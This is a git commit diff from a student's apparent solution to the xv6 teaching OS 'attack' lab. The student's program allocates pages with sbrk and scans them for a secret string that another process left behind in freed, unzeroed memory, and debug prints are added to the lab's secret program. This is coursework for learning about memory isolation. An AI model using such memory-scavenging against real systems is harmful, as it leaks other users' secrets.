dc5c947ca28d1234d12346e61a8bb017c90ddd3f
masterAllen <allenhong2000@foxmail.com>
2025-04-09 23:26:46 +0800

    solve attack_xv6

--- user/attack.c
+++ user/attack.c
@@ -9,5 +9,34 @@ main(int argc, char *argv[])
   // your code here.  you should write the secret to fd 2 using write
   // (e.g., write(2, secret, 8)
 
-  exit(1);
+  for(int i = 0; i < 3000; i++) {
+    char *end = sbrk(1 * PGSIZE);
+
+    int ok_flag = 0;
+    for (int k = 0; k < 32-5; k++) {
+      if (end[k] && end[k+1] && end[k+2] && end[k+3] && end[k+4]) { 
+        ok_flag = 1;
+        printf("end[%d]: %s\n", k, end+k);
+        k += 5;
+      }
+    }
+    if (ok_flag) {
+      printf("end[%d]: %p\n", i, end);
+    }
+  }
+
+  // char *end = sbrk(PGSIZE*32);
+  // printf("PGSIZE: %d\n", PGSIZE);
+  // printf("end: %p\n", end);
+  // end = end + 9 * PGSIZE;
+  // printf("end: %p\n", end);
+
+  // printf("end: %s\n", end);
+  // for (int i = 0; i < 4; i++) {
+  //   printf("%x ", end[32+i]);
+  // }
+  // printf("\n");
+  exit(0);
 }
+
+
--- user/secret.c
+++ user/secret.c
@@ -12,9 +12,18 @@ main(int argc, char *argv[])
     exit(1);
   }
   char *end = sbrk(PGSIZE*32);
+  printf("PGSIZE: %d\n", PGSIZE);
+  printf("end: %p\n", end);
   end = end + 9 * PGSIZE;
+  printf("end: %p\n", end);
   strcpy(end, "my very very very secret pw is:   ");
+  printf("end: %s\n", end);
   strcpy(end+32, argv[1]);
+
+  for (int i = 0; i < 4; i++) {
+    printf("%x ", end[32+i]);
+  }
+  printf("\n");
   exit(0);
 }
 
